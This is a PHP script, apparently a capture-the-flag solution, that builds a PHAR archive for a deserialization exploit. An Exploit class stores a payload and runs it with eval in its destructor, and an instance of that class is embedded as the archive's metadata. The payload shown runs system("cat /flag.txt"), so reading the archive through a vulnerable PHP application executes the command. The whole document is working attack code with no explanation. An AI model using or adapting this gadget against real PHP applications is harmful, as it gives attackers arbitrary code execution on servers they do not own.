
<?php
class Exploit {
    public $payload;
    public function __construct($payload) {
        $this->payload = $payload;
    }
    public function __destruct() {
        eval($this->payload);
    }
}
$exploit = new Exploit('system("cat /flag.txt");');
$phar = new Phar('exploit.phar');
$phar['exploit'] = 'content';
$phar->setStub('<?php __HALT_COMPILER(); ?>');
$phar->setMetadata($exploit);
?>
